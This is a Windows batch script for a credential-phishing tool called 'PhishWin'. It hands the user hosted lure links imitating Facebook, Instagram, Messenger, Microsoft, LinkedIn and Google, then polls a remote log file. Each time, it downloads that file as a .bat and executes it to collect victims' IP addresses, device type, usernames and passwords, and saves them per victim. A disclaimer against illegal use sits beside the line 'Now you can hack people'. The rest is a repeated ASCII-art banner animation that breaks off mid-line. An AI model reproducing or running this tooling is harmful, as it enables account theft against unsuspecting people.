@echo off
title PHISHING WINDOWS
set IP=None
set got=no
set password=None_6070_pass
cd desktop
mode con: cols=126 lines=38
for /F "tokens=1,2 delims=#" %%a in ('"prompt #$H#$E# & echo on & for %%b in (1) do     rem"') do (
  set "DEL=%%a"
)
color 2
echo This tool is in devolopment. So you can tell this 
echo is an early access to this tool. Do not use this
echo tool for illigel activities. Use this for fun.
echo In this tool the only thing works best is facebook.
echo And others are in development. Messenger works but 
echo still in devolopment. 2 phases are still remaining
echo of 3. For now just use facebook. It may have a 2 
echo to 4 seconds delay on it. We will add more
echo websites to this tool and more versions to it.
echo Till then stay safe and healthy.
pause
cls
echo Usage:
echo      [1] Select a website to start phishing
echo      [2] Enter a name to save the credentials
echo      [3] Select the link (It will pause the tool)
echo      [4] Copy the link with Ctrl + c
echo      [5] Press enter to resume
echo.
echo That's it!
echo You have successfully learned to use this tool!
echo Now you can hack people with phishing attack!
pause
cls
echo This is the modyfied version of this tool!
echo Some more feature has been added to this tool.
echo Below are the main changes.
echo. 
echo [1] Type "intro_ttl" and see magic! Type "creator"
echo [2] The link will get auto copied.
echo [3] Some bug fixes.
echo [4] Upto 98%% ip collection update.
echo [5] More fast and relieble.
echo.
pause 
:top
cls
mode con: cols=128 lines=38
echo ---------------------------------------------------
echo                      PhishWin            * modyfied
echo ---------------------------------------------------
echo.
call :colorEcho 02 "[1]"
call :colorEcho 09 " Facebook"
echo.
call :colorEcho 02 "[2]"
call :colorEcho 04 " Instagram"
echo.
call :colorEcho 02 "[3]"
call :colorEcho 09 " Messenger"
echo.
call :colorEcho 02 "[4]"
call :colorEcho 08 " Microsoft"
echo.
call :colorEcho 02 "[5]"
call :colorEcho 01 " LinkedIn"
echo.
call :colorEcho 02 "[6]"
call :colorEcho 09 " G"
call :colorEcho 0C "o"
call :colorEcho 0E "o"
call :colorEcho 09 "g"
call :colorEcho 0A "l"
call :colorEcho 0C "e"
echo.
echo.
set /p var=Enter the number:
	if %var% == 1 goto facebook
	if %var% == 2 goto instagram
	if %var% == 3 goto messenger
	if %var% == 4 goto microsoft
	if %var% == 5 goto linkedin
    if %var% == 6 goto google
	if "%var%" == "intro_ttl" goto anime
	if %var% == creator goto ourcreators
echo INVALID NUMBER!
pause
goto top
:facebook
set /p victim=Enter the victims name:
echo Give this link to victim: " https://postconnectamc.000webhostapp.com/ "
echo https://postconnectamc.000webhostapp.com/ | clip
echo Listening .....
echo.
echo.
goto workf
:workf
powershell -command "Invoke-WebRequest 'https://postconnectamc.000webhostapp.com/log.txt' -Outfile 'loguse.bat'"
call loguse.bat
if not %IP% == None goto ipfound  
del loguse.bat  
goto workf
:ipfound
echo Victim has entered the link ......
echo IP of the victim = %IP%
echo %victim%'s ip: %IP% >> ip.txt
echo Ip address saved on: ip.txt
goto workif
:workif
powershell -command "Invoke-WebRequest 'https://postconnectamc.000webhostapp.com/log.txt' -Outfile 'loguse.bat'"
call loguse.bat
if %got% == yes goto gotf  
del loguse.bat
goto workif
:gotf
if %password% == None_6070_pass (
	set device=PC or Tablet
) else (
	set device=Mobile
	set pass=%password%
)
echo Credentials found ...
echo.
echo Device = %device%
echo IP address = %IP%
echo.
echo Username = %email%
echo Password = %pass% 
echo.
powershell -command "Invoke-WebRequest 'https://postconnectamc.000webhostapp.com/deltor.php' | Out-Null
echo --------------------------------------------->> "%victim%".txt
echo                    %victim%>> "%victim%".txt
echo --------------------------------------------->> "%victim%".txt
echo.>> "%victim%".txt
echo Device = %device%>> "%victim%".txt
echo IP address = %IP%>> "%victim%".txt
echo.>> "%victim%".txt
echo Username = %email%>> "%victim%".txt
echo Password = %pass%>> "%victim%".txt
echo Credentials saved at "%victim%.txt"
del loguse.bat
pause
goto top
exit
:instagram
set /p victim=Enter the victims name:
echo Give this link to victim: " https://postconnectamc.000webhostapp.com/instagram.php "
echo https://postconnectamc.000webhostapp.com/instagram.php | clip
echo Listening .....
echo.
echo.
goto worki
:worki
powershell -command "Invoke-WebRequest 'https://postconnectamc.000webhostapp.com/log.txt' -Outfile 'loguse.bat'"
call loguse.bat
if not %IP% == None goto ipiffo 
del loguse.bat
goto worki
:ipiffo
echo Victim has entered the link ......
echo IP of the victim = %IP%
echo %victim%'s ip: %IP% >> ip.txt
echo Ip address saved on: ip.txt
goto workinstal
:workinstal
powershell -command "Invoke-WebRequest 'https://postconnectamc.000webhostapp.com/log.txt' -Outfile 'loguse.bat'"
call loguse.bat
if %got% == yes goto goti  
del loguse.bat
goto workinstal
:goti
echo %User-Agent%>>tempdf.txt
type tempdf.txt | find "Mobile" > nul
if %errorlevel% == 1 (
	set device=PC or Tablet 
	set email=%username%
	set pass=%password%
) else (
	set device=Mobile
	set email=%username%
	set pass=%password%
)
del tempdf.txt
echo Credentials found ...
echo.
echo Device = %device%
echo IP address = %IP%
echo.
echo Username = %email%
echo Password = %pass% 
echo.
powershell -command "Invoke-WebRequest 'https://postconnectamc.000webhostapp.com/deltor.php' | Out-Null
echo --------------------------------------------->> "%victim%".txt
echo                    %victim%>> "%victim%".txt
echo --------------------------------------------->> "%victim%".txt
echo.>> "%victim%".txt
echo Device = %device%>> "%victim%".txt
echo IP address = %IP%>> "%victim%".txt
echo.>> "%victim%".txt
echo Username = %email%>> "%victim%".txt
echo Password = %pass%>> "%victim%".txt
echo Credentials saved at "%victim%.txt"
del loguse.bat
pause
goto top
rem asdasdasdasdasdasdasdasdasdasdadadasdadasasdasdsasaddsdsaasadasdasdadasasdasdasdasdasdasadasasdsadasdasasdadasdaasdasdasdas
:messenger
echo Give this link to victim: " https://postconnectamc.000webhostapp.com/Massanger.html "
echo Listening .....
goto workm
:workm
powershell -command "Invoke-WebRequest 'https://postconnectamc.000webhostapp.com/log2.txt' -Outfile 'loguse2.bat'"
call loguse2.bat
if %got% == yes goto gotm
del loguse2.bat
goto workm
:gotm
echo Credentials found ...
echo IP address = %IP%
echo Username = %email%
echo Password = %pass%
powershell -command "Invoke-WebRequest 'https://postconnectamc.000webhostapp.com/deltor2.php' | Out-Null
del loguse2.bat
pause
goto top
//
:microsoft
set /p victim=Enter the victims name:
echo Give this link to victim: " https://postconnectamc.000webhostapp.com/microsoft.php "
echo https://postconnectamc.000webhostapp.com/microsoft.php | clip
echo Listening .....
echo.
echo.
goto workmi
:workmi
powershell -command "Invoke-WebRequest 'https://postconnectamc.000webhostapp.com/log.txt' -Outfile 'loguse.bat'"
call loguse.bat
if not %IP% == None goto ipiffolinkmic
del loguse.bat
goto workmi
:ipiffolinkmic
echo Victim has entered the link ......
echo IP of the victim = %IP%
echo %victim%'s ip: %IP% >> ip.txt
echo Ip address saved on: ip.txt
goto worklinkedinmic
:worklinkedinmic
powershell -command "Invoke-WebRequest 'https://postconnectamc.000webhostapp.com/log.txt' -Outfile 'loguse.bat'"
call loguse.bat
if %got% == yes goto gotmi
del loguse.bat
goto worklinkedinmic
:gotmi
echo %User-Agent%>>tempdf.txt
type tempdf.txt | find "Mobile" > nul
if %errorlevel% == 1 (
	set device=PC or Tablet 
	set email=%loginfmt%
	set pass=%passwd%
) else (
	set device=Mobile
	set email=%loginfmt%
	set pass=%passwd%
)
del tempdf.txt
echo Credentials found ...
echo.
echo Device = %device%
echo IP address = %IP%
echo.
echo Username = %email%
echo Password = %pass% 
echo.
powershell -command "Invoke-WebRequest 'https://postconnectamc.000webhostapp.com/deltor.php' | Out-Null
echo --------------------------------------------->> "%victim%".txt
echo                    %victim%>> "%victim%".txt
echo --------------------------------------------->> "%victim%".txt
echo.>> "%victim%".txt
echo Device = %device%>> "%victim%".txt
echo IP address = %IP%>> "%victim%".txt
echo.>> "%victim%".txt
echo Username = %email%>> "%victim%".txt
echo Password = %pass%>> "%victim%".txt
echo Credentials saved at "%victim%.txt"
del loguse.bat
pause
goto top
:linkedin
set /p victim=Enter the victims name:
echo Give this link to victim: " https://postconnectamc.000webhostapp.com/linkedin.php "
echo https://postconnectamc.000webhostapp.com/linkedin.php | clip
echo Listening .....
echo.
echo.
goto workl
:workl
powershell -command "Invoke-WebRequest 'https://postconnectamc.000webhostapp.com/log.txt' -Outfile 'loguse.bat'"
call loguse.bat
if not %IP% == None goto ipiffolink
del loguse.bat
goto workl
:ipiffolink
echo Victim has entered the link ......
echo IP of the victim = %IP%
echo %victim%'s ip: %IP% >> ip.txt
echo Ip address saved on: ip.txt
goto worklinkedin
:worklinkedin
powershell -command "Invoke-WebRequest 'https://postconnectamc.000webhostapp.com/log.txt' -Outfile 'loguse.bat'"
call loguse.bat
if %got% == yes goto gotl  
del loguse.bat
goto worklinkedin
:gotl
echo %User-Agent%>>tempdf.txt
type tempdf.txt | find "Mobile" > nul
if %errorlevel% == 1 (
	set device=PC or Tablet 
	set email=%session_key%
	set pass=%session_password%
) else (
	set device=Mobile
	set email=%session_key%
	set pass=%session_password%
)
del tempdf.txt
echo Credentials found ...
echo.
echo Device = %device%
echo IP address = %IP%
echo.
echo Username = %email%
echo Password = %pass% 
echo.
powershell -command "Invoke-WebRequest 'https://postconnectamc.000webhostapp.com/deltor.php' | Out-Null
echo --------------------------------------------->> "%victim%".txt
echo                    %victim%>> "%victim%".txt
echo --------------------------------------------->> "%victim%".txt
echo.>> "%victim%".txt
echo Device = %device%>> "%victim%".txt
echo IP address = %IP%>> "%victim%".txt
echo.>> "%victim%".txt
echo Username = %email%>> "%victim%".txt
echo Password = %pass%>> "%victim%".txt
echo Credentials saved at "%victim%.txt"
del loguse.bat
pause
goto top
:google
set /p victim=Enter the victims name:
echo Give this link to victim: " https://postconnectamc.000webhostapp.com/google.php "
echo https://postconnectamc.000webhostapp.com/google.php | clip
echo Listening .....
echo.
echo.
goto workg
:workg
powershell -command "Invoke-WebRequest 'https://postconnectamc.000webhostapp.com/log.txt' -Outfile 'loguse.bat'"
call loguse.bat
if not %IP% == None goto ipfoundg
del loguse.bat  
goto workg
:ipfoundg
echo Victim has entered the link ......
echo IP of the victim = %IP%
echo %victim%'s ip: %IP% >> ip.txt
echo Ip address saved on: ip.txt
goto workgo
:workgo
powershell -command "Invoke-WebRequest 'https://postconnectamc.000webhostapp.com/log.txt' -Outfile 'loguse.bat'"
call loguse.bat
if %got% == yes goto gotgog
del loguse.bat
goto workgo
:gotgog
echo %User-Agent%>>tempdf.txt
type tempdf.txt | find "Mobile" > nul
if %errorlevel% == 1 (
	set device=PC or Tablet 
	set pass=%password%
) else (
	set device=Mobile
	set pass=%password%
)
del tempdf.txt
echo Credentials found ...
echo.
echo Device = %device%
echo IP address = %IP%
echo.
echo Username = %email%
echo Password = %pass% 
echo.
powershell -command "Invoke-WebRequest 'https://postconnectamc.000webhostapp.com/deltor.php' | Out-Null
echo --------------------------------------------->> "%victim%".txt
echo                    %victim%>> "%victim%".txt
echo --------------------------------------------->> "%victim%".txt
echo.>> "%victim%".txt
echo Device = %device%>> "%victim%".txt
echo IP address = %IP%>> "%victim%".txt
echo.>> "%victim%".txt
echo Username = %email%>> "%victim%".txt
echo Password = %pass%>> "%victim%".txt
echo Credentials saved at "%victim%.txt"
del loguse.bat
pause
goto top
cls























:anime
mode con: cols=147 lines=6
cls
goto animephish
:animephish
echo                                                             ".______    __    __   __       _______. __    __  ____    __    ____  __  .__   __." 
echo                                                             "|   _  \  |  |  |  | |  |     /       ||  |  |  | \   \  /  \  /   / |  | |  \ |  |" 
echo                                                             "|  |_)  | |  |__|  | |  |    |   (----`|  |__|  |  \   \/    \/   /  |  | |   \|  |" 
echo                                                             "|   ___/  |   __   | |  |     \   \    |   __   |   \            /   |  | |  . `  |" 
echo                                                             "|  |      |  |  |  | |  | .----)   |   |  |  |  |    \    /\    /    |  | |  |\   |" 
echo                                                             "| _|      |__|  |__| |__| |_______/    |__|  |__|     \__/  \__/     |__| |__| \__|" 
ping -n 1 -w 1.1.1.1 > nul
ping -n 1 -w 1.1.1.1 > nul
cls
echo                                                            ".______    __    __   __       _______. __    __  ____    __    ____  __  .__   __." 
echo                                                            "|   _  \  |  |  |  | |  |     /       ||  |  |  | \   \  /  \  /   / |  | |  \ |  |" 
echo                                                            "|  |_)  | |  |__|  | |  |    |   (----`|  |__|  |  \   \/    \/   /  |  | |   \|  |" 
echo                                                            "|   ___/  |   __   | |  |     \   \    |   __   |   \            /   |  | |  . `  |" 
echo                                                            "|  |      |  |  |  | |  | .----)   |   |  |  |  |    \    /\    /    |  | |  |\   |" 
echo                                                            "| _|      |__|  |__| |__| |_______/    |__|  |__|     \__/  \__/     |__| |__| \__|"                                                                                     
ping -n 1 -w 1.1.1.1 > nul
ping -n 1 -w 1.1.1.1 > nul
cls
echo                                                           ".______    __    __   __       _______. __    __  ____    __    ____  __  .__   __." 
echo                                                           "|   _  \  |  |  |  | |  |     /       ||  |  |  | \   \  /  \  /   / |  | |  \ |  |" 
echo                                                           "|  |_)  | |  |__|  | |  |    |   (----`|  |__|  |  \   \/    \/   /  |  | |   \|  |" 
echo                                                           "|   ___/  |   __   | |  |     \   \    |   __   |   \            /   |  | |  . `  |" 
echo                                                           "|  |      |  |  |  | |  | .----)   |   |  |  |  |    \    /\    /    |  | |  |\   |" 
echo                                                           "| _|      |__|  |__| |__| |_______/    |__|  |__|     \__/  \__/     |__| |__| \__|"                                                                                    
ping -n 1 -w 1.1.1.1 > nul
ping -n 1 -w 1.1.1.1 > nul
cls
echo                                                          ".______    __    __   __       _______. __    __  ____    __    ____  __  .__   __." 
echo                                                          "|   _  \  |  |  |  | |  |     /       ||  |  |  | \   \  /  \  /   / |  | |  \ |  |" 
echo                                                          "|  |_)  | |  |__|  | |  |    |   (----`|  |__|  |  \   \/    \/   /  |  | |   \|  |" 
echo                                                          "|   ___/  |   __   | |  |     \   \    |   __   |   \            /   |  | |  . `  |" 
echo                                                          "|  |      |  |  |  | |  | .----)   |   |  |  |  |    \    /\    /    |  | |  |\   |" 
echo                                                          "| _|      |__|  |__| |__| |_______/    |__|  |__|     \__/  \__/     |__| |__| \__|" 
ping -n 1 -w 1.1.1.1 > nul
ping -n 1 -w 1.1.1.1 > nul
cls
echo                                                         ".______    __    __   __       _______. __    __  ____    __    ____  __  .__   __." 
echo                                                         "|   _  \  |  |  |  | |  |     /       ||  |  |  | \   \  /  \  /   / |  | |  \ |  |" 
echo                                                         "|  |_)  | |  |__|  | |  |    |   (----`|  |__|  |  \   \/    \/   /  |  | |   \|  |" 
echo                                                         "|   ___/  |   __   | |  |     \   \    |   __   |   \            /   |  | |  . `  |" 
echo                                                         "|  |      |  |  |  | |  | .----)   |   |  |  |  |    \    /\    /    |  | |  |\   |" 
echo                                                         "| _|      |__|  |__| |__| |_______/    |__|  |__|     \__/  \__/     |__| |__| \__|" 
ping -n 1 -w 1.1.1.1 > nul
ping -n 1 -w 1.1.1.1 > nul
cls
echo                                                        ".______    __    __   __       _______. __    __  ____    __    ____  __  .__   __." 
echo                                                        "|   _  \  |  |  |  | |  |     /       ||  |  |  | \   \  /  \  /   / |  | |  \ |  |" 
echo                                                        "|  |_)  | |  |__|  | |  |    |   (----`|  |__|  |  \   \/    \/   /  |  | |   \|  |" 
echo                                                        "|   ___/  |   __   | |  |     \   \    |   __   |   \            /   |  | |  . `  |" 
echo                                                        "|  |      |  |  |  | |  | .----)   |   |  |  |  |    \    /\    /    |  | |  |\   |" 
echo                                                        "| _|      |__|  |__| |__| |_______/    |__|  |__|     \__/  \__/     |__| |__| \__|" 
ping -n 1 -w 1.1.1.1 > nul
ping -n 1 -w 1.1.1.1 > nul
cls
echo                                                       ".______    __    __   __       _______. __    __  ____    __    ____  __  .__   __." 
echo                                                       "|   _  \  |  |  |  | |  |     /       ||  |  |  | \   \  /  \  /   / |  | |  \ |  |" 
echo                                                       "|  |_)  | |  |__|  | |  |    |   (----`|  |__|  |  \   \/    \/   /  |  | |   \|  |" 
echo                                                       "|   ___/  |   __   | |  |     \   \    |   __   |   \            /   |  | |  . `  |" 
echo                                                       "|  |      |  |  |  | |  | .----)   |   |  |  |  |    \    /\    /    |  | |  |\   |" 
echo                                                       "| _|      |__|  |__| |__| |_______/    |__|  |__|     \__/  \__/     |__| |__| \__|" 
ping -n 1 -w 1.1.1.1 > nul
ping -n 1 -w 1.1.1.1 > nul
cls
echo                                                      ".______    __    __   __       _______. __    __  ____    __    ____  __  .__   __." 
echo                                                      "|   _  \  |  |  |  | |  |     /       ||  |  |  | \   \  /  \  /   / |  | |  \ |  |" 
echo                                                      "|  |_)  | |  |__|  | |  |    |   (----`|  |__|  |  \   \/    \/   /  |  | |   \|  |" 
echo                                                      "|   ___/  |   __   | |  |     \   \    |   __   |   \            /   |  | |  . `  |" 
echo                                                      "|  |      |  |  |  | |  | .----)   |   |  |  |  |    \    /\    /    |  | |  |\   |" 
echo                                                      "| _|      |__|  |__| |__| |_______/    |__|  |__|     \__/  \__/     |__| |__| \__|" 
ping -n 1 -w 1.1.1.1 > nul
ping -n 1 -w 1.1.1.1 > nul
cls
echo                                                     ".______    __    __   __       _______. __    __  ____    __    ____  __  .__   __." 
echo                                                     "|   _  \  |  |  |  | |  |     /       ||  |  |  | \   \  /  \  /   / |  | |  \ |  |" 
echo                                                     "|  |_)  | |  |__|  | |  |    |   (----`|  |__|  |  \   \/    \/   /  |  | |   \|  |" 
echo                                                     "|   ___/  |   __   | |  |     \   \    |   __   |   \            /   |  | |  . `  |" 
echo                                                     "|  |      |  |  |  | |  | .----)   |   |  |  |  |    \    /\    /    |  | |  |\   |" 
echo                                                     "| _|      |__|  |__| |__| |_______/    |__|  |__|     \__/  \__/     |__| |__| \__|" 
ping -n 1 -w 1.1.1.1 > nul
ping -n 1 -w 1.1.1.1 > nul
cls
echo                                                    ".______    __    __   __       _______. __    __  ____    __    ____  __  .__   __." 
echo                                                    "|   _  \  |  |  |  | |  |     /       ||  |  |  | \   \  /  \  /   / |  | |  \ |  |" 
echo                                                    "|  |_)  | |  |__|  | |  |    |   (----`|  |__|  |  \   \/    \/   /  |  | |   \|  |" 
echo                                                    "|   ___/  |   __   | |  |     \   \    |   __   |   \            /   |  | |  . `  |" 
echo                                                    "|  |      |  |  |  | |  | .----)   |   |  |  |  |    \    /\    /    |  | |  |\   |" 
echo                                                    "| _|      |__|  |__| |__| |_______/    |__|  |__|     \__/  \__/     |__| |__| \__|" 
ping -n 1 -w 1.1.1.1 > nul
ping -n 1 -w 1.1.1.1 > nul
cls
echo                                                   ".______    __    __   __       _______. __    __  ____    __    ____  __  .__   __." 
echo                                                   "|   _  \  |  |  |  | |  |     /       ||  |  |  | \   \  /  \  /   / |  | |  \ |  |" 
echo                                                   "|  |_)  | |  |__|  | |  |    |   (----`|  |__|  |  \   \/    \/   /  |  | |   \|  |" 
echo                                                   "|   ___/  |   __   | |  |     \   \    |   __   |   \            /   |  | |  . `  |" 
echo                                                   "|  |      |  |  |  | |  | .----)   |   |  |  |  |    \    /\    /    |  | |  |\   |" 
echo                                                   "| _|      |__|  |__| |__| |_______/    |__|  |__|     \__/  \__/     |__| |__| \__|" 
ping -n 1 -w 1.1.1.1 > nul
ping -n 1 -w 1.1.1.1 > nul
cls
echo                                                  ".______    __    __   __       _______. __    __  ____    __    ____  __  .__   __." 
echo                                                  "|   _  \  |  |  |  | |  |     /       ||  |  |  | \   \  /  \  /   / |  | |  \ |  |" 
echo                                                  "|  |_)  | |  |__|  | |  |    |   (----`|  |__|  |  \   \/    \/   /  |  | |   \|  |" 
echo                                                  "|   ___/  |   __   | |  |     \   \    |   __   |   \            /   |  | |  . `  |" 
echo                                                  "|  |      |  |  |  | |  | .----)   |   |  |  |  |    \    /\    /    |  | |  |\   |" 
echo                                                  "| _|      |__|  |__| |__| |_______/    |__|  |__|     \__/  \__/     |__| |__| \__|" 
ping -n 1 -w 1.1.1.1 > nul
ping -n 1 -w 1.1.1.1 > nul
cls
echo                                                 ".______    __    __   __       _______. __    __  ____    __    ____  __  .__   __." 
echo                                                 "|   _  \  |  |  |  | |  |     /       ||  |  |  | \   \  /  \  /   / |  | |  \ |  |" 
echo                                                 "|  |_)  | |  |__|  | |  |    |   (----`|  |__|  |  \   \/    \/   /  |  | |   \|  |" 
echo                                                 "|   ___/  |   __   | |  |     \   \    |   __   |   \            /   |  | |  . `  |" 
echo                                                 "|  |      |  |  |  | |  | .----)   |   |  |  |  |    \    /\    /    |  | |  |\   |" 
echo                                                 "| _|      |__|  |__| |__| |_______/    |__|  |__|     \__/  \__/     |__| |__| \__|" 
ping -n 1 -w 1.1.1.1 > nul
ping -n 1 -w 1.1.1.1 > nul
cls
echo                                                ".______    __    __   __       _______. __    __  ____    __    ____  __  .__   __." 
echo                                                "|   _  \  |  |  |  | |  |     /       ||  |  |  | \   \  /  \  /   / |  | |  \ |  |" 
echo                                                "|  |_)  | |  |__|  | |  |    |   (----`|  |__|  |  \   \/    \/   /  |  | |   \|  |" 
echo                                                "|   ___/  |   __   | |  |     \   \    |   __   |   \            /   |  | |  . `  |" 
echo                                                "|  |      |  |  |  | |  | .----)   |   |  |  |  |    \    /\    /    |  | |  |\   |" 
echo                                                "| _|      |__|  |__| |__| |_______/    |__|  |__|     \__/  \__/     |__| |__| \__|" 
ping -n 1 -w 1.1.1.1 > nul
ping -n 1 -w 1.1.1.1 > nul
cls
echo                                               ".______    __    __   __       _______. __    __  ____    __    ____  __  .__   __." 
echo                                               "|   _  \  |  |  |  | |  |     /       ||  |  |  | \   \  /  \  /   / |  | |  \ |  |" 
echo                                               "|  |_)  | |  |__|  | |  |    |   (----`|  |__|  |  \   \/    \/   /  |  | |   \|  |" 
echo                                               "|   ___/  |   __   | |  |     \   \    |   __   |   \            /   |  | |  . `  |" 
echo                                               "|  |      |  |  |  | |  | .----)   |   |  |  |  |    \    /\    /    |  | |  |\   |" 
echo                                               "| _|      |__|  |__| |__| |_______/    |__|  |__|     \__/  \__/     |__| |__| \__|" 
ping -n 1 -w 1.1.1.1 > nul
ping -n 1 -w 1.1.1.1 > nul
cls
echo                                              ".______    __    __   __       _______. __    __  ____    __    ____  __  .__   __." 
echo                                              "|   _  \  |  |  |  | |  |     /       ||  |  |  | \   \  /  \  /   / |  | |  \ |  |" 
echo                                              "|  |_)  | |  |__|  | |  |    |   (----`|  |__|  |  \   \/    \/   /  |  | |   \|  |" 
echo                                              "|   ___/  |   __   | |  |     \   \    |   __   |   \            /   |  | |  . `  |" 
echo                                              "|  |      |  |  |  | |  | .----)   |   |  |  |  |    \    /\    /    |  | |  |\   |" 
echo                                              "| _|      |__|  |__| |__| |_______/    |__|  |__|     \__/  \__/     |__| |__| \__|" 
ping -n 1 -w 1.1.1.1 > nul
ping -n 1 -w 1.1.1.1 > nul
cls
echo                                             ".______    __    __   __       _______. __    __  ____    __    ____  __  .__   __." 
echo                                             "|   _  \  |  |  |  | |  |     /       ||  |  |  | \   \  /  \  /   / |  | |  \ |  |" 
echo                                             "|  |_)  | |  |__|  | |  |    |   (----`|  |__|  |  \   \/    \/   /  |  | |   \|  |" 
echo                                             "|   ___/  |   __   | |  |     \   \    |   __   |   \            /   |  | |  . `  |" 
echo                                             "|  |      |  |  |  | |  | .----)   |   |  |  |  |    \    /\    /    |  | |  |\   |" 
echo                                             "| _|      |__|  |__| |__| |_______/    |__|  |__|     \__/  \__/     |__| |__| \__|" 
ping -n 1 -w 1.1.1.1 > nul
ping -n 1 -w 1.1.1.1 > nul
cls
echo                                            ".______    __    __   __       _______. __    __  ____    __    ____  __  .__   __." 
echo                                            "|   _  \  |  |  |  | |  |     /       ||  |  |  | \   \  /  \  /   / |  | |  \ |  |" 
echo                                            "|  |_)  | |  |__|  | |  |    |   (----`|  |__|  |  \   \/    \/   /  |  | |   \|  |" 
echo                                            "|   ___/  |   __   | |  |     \   \    |   __   |   \            /   |  | |  . `  |" 
echo                                            "|  |      |  |  |  | |  | .----)   |   |  |  |  |    \    /\    /    |  | |  |\   |" 
echo                                            "| _|      |__|  |__| |__| |_______/    |__|  |__|     \__/  \__/     |__| |__| \__|" 
ping -n 1 -w 1.1.1.1 > nul
ping -n 1 -w 1.1.1.1 > nul
cls
echo                                           ".______    __    __   __       _______. __    __  ____    __    ____  __  .__   __." 
echo                                           "|   _  \  |  |  |  | |  |     /       ||  |  |  | \   \  /  \  /   / |  | |  \ |  |" 
echo                                           "|  |_)  | |  |__|  | |  |    |   (----`|  |__|  |  \   \/    \/   /  |  | |   \|  |" 
echo                                           "|   ___/  |   __   | |  |     \   \    |   __   |   \            /   |  | |  . `  |" 
echo                                           "|  |      |  |  |  | |  | .----)   |   |  |  |  |    \    /\    /    |  | |  |\   |" 
echo                                           "| _|      |__|  |__| |__| |_______/    |__|  |__|     \__/  \__/     |__| |__| \__|" 
ping -n 1 -w 1.1.1.1 > nul
ping -n 1 -w 1.1.1.1 > nul
cls
echo                                          ".______    __    __   __       _______. __    __  ____    __    ____  __  .__   __." 
echo                                          "|   _  \  |  |  |  | |  |     /       ||  |  |  | \   \  /  \  /   / |  | |  \ |  |" 
echo                                          "|  |_)  | |  |__|  | |  |    |   (----`|  |__|  |  \   \/    \/   /  |  | |   \|  |" 
echo                                          "|   ___/  |   __   | |  |     \   \    |   __   |   \            /   |  | |  . `  |" 
echo                                          "|  |      |  |  |  | |  | .----)   |   |  |  |  |    \    /\    /    |  | |  |\   |" 
echo                                          "| _|      |__|  |__| |__| |_______/    |__|  |__|     \__/  \__/     |__| |__| \__|" 
ping -n 1 -w 1.1.1.1 > nul
ping -n 1 -w 1.1.1.1 > nul
cls
echo                                         ".______    __    __   __       _______. __    __  ____    __    ____  __  .__   __." 
echo                                         "|   _  \  |  |  |  | |  |     /       ||  |  |  | \   \  /  \  /   / |  | |  \ |  |" 
echo                                         "|  |_)  | |  |__|  | |  |    |   (----`|  |__|  |  \   \/    \/   /  |  | |   \|  |" 
echo                                         "|   ___/  |   __   | |  |     \   \    |   __   |   \            /   |  | |  . `  |" 
echo                                         "|  |      |  |  |  | |  | .----)   |   |  |  |  |    \    /\    /    |  | |  |\   |" 
echo                                         "| _|      |__|  |__| |__| |_______/    |__|  |__|     \__/  \__/     |__| |__| \__|" 
ping -n 1 -w 1.1.1.1 > nul
ping -n 1 -w 1.1.1.1 > nul
cls
echo                                        ".______    __    __   __       _______. __    __  ____    __    ____  __  .__   __." 
echo                                        "|   _  \  |  |  |  | |  |     /       ||  |  |  | \   \  /  \  /   / |  | |  \ |  |" 
echo                                        "|  |_)  | |  |__|  | |  |    |   (----`|  |__|  |  \   \/    \/   /  |  | |   \|  |" 
echo                                        "|   ___/  |   __   | |  |     \   \    |   __   |   \            /   |  | |  . `  |" 
echo                                        "|  |      |  |  |  | |  | .----)   |   |  |  |  |    \    /\    /    |  | |  |\   |" 
echo                                        "| _|      |__|  |__| |__| |_______/    |__|  |__|     \__/  \__/     |__| |__| \__|" 
ping -n 1 -w 1.1.1.1 > nul
ping -n 1 -w 1.1.1.1 > nul
cls
echo                                       ".______    __    __   __       _______. __    __  ____    __    ____  __  .__   __." 
echo                                       "|   _  \  |  |  |  | |  |     /       ||  |  |  | \   \  /  \  /   / |  | |  \ |  |" 
echo                                       "|  |_)  | |  |__|  | |  |    |   (----`|  |__|  |  \   \/    \/   /  |  | |   \|  |" 
echo                                       "|   ___/  |   __   | |  |     \   \    |   __   |   \            /   |  | |  . `  |" 
echo                                       "|  |      |  |  |  | |  | .----)   |   |  |  |  |    \    /\    /    |  | |  |\   |" 
echo                                       "| _|      |__|  |__| |__| |_______/    |__|  |__|     \__/  \__/     |__| |__| \__|" 
ping -n 1 -w 1.1.1.1 > nul
ping -n 1 -w 1.1.1.1 > nul
cls
echo                                      ".______    __    __   __       _______. __    __  ____    __    ____  __  .__   __." 
echo                                      "|   _  \  |  |  |  | |  |     /       ||  |  |  | \   \  /  \  /   / |  | |  \ |  |" 
echo                                      "|  |_)  | |  |__|  | |  |    |   (----`|  |__|  |  \   \/    \/   /  |  | |   \|  |" 
echo                                      "|   ___/  |   __   | |  |     \   \    |   __   |   \            /   |  | |  . `  |" 
echo                                      "|  |      |  |  |  | |  | .----)   |   |  |  |  |    \    /\    /    |  | |  |\   |" 
echo                                      "| _|      |__|  |__| |__| |_______/    |__|  |__|     \__/  \__/     |__| |__| \__|" 
ping -n 1 -w 1.1.1.1 > nul
ping -n 1 -w 1.1.1.1 > nul
cls
echo                                     ".______    __    __   __       _______. __    __  ____    __    ____  __  .__   __." 
echo                                     "|   _  \  |  |  |  | |  |     /       ||  |  |  | \   \  /  \  /   / |  | |  \ |  |" 
echo                                     "|  |_)  | |  |__|  | |  |    |   (----`|  |__|  |  \   \/    \/   /  |  | |   \|  |" 
echo                                     "|   ___/  |   __   | |  |     \   \    |   __   |   \            /   |  | |  . `  |" 
echo                                     "|  |      |  |  |  | |  | .----)   |   |  |  |  |    \    /\    /    |  | |  |\   |" 
echo                                     "| _|      |__|  |__| |__| |_______/    |__|  |__|     \__/  \__/     |__| |__| \__|" 
ping -n 1 -w 1.1.1.1 > nul
ping -n 1 -w 1.1.1.1 > nul
cls
echo                                    ".______    __    __   __       _______. __    __  ____    __    ____  __  .__   __." 
echo                                    "|   _  \  |  |  |  | |  |     /       ||  |  |  | \   \  /  \  /   / |  | |  \ |  |" 
echo                                    "|  |_)  | |  |__|  | |  |    |   (----`|  |__|  |  \   \/    \/   /  |  | |   \|  |" 
echo                                    "|   ___/  |   __   | |  |     \   \    |   __   |   \            /   |  | |  . `  |" 
echo                                    "|  |      |  |  |  | |  | .----)   |   |  |  |  |    \    /\    /    |  | |  |\   |" 
echo                                    "| _|      |__|  |__| |__| |_______/    |__|  |__|     \__/  \__/     |__| |__| \__|" 
ping -n 1 -w 1.1.1.1 > nul
ping -n 1 -w 1.1.1.1 > nul
cls
echo                                   ".______    __    __   __       _______. __    __  ____    __    ____  __  .__   __." 
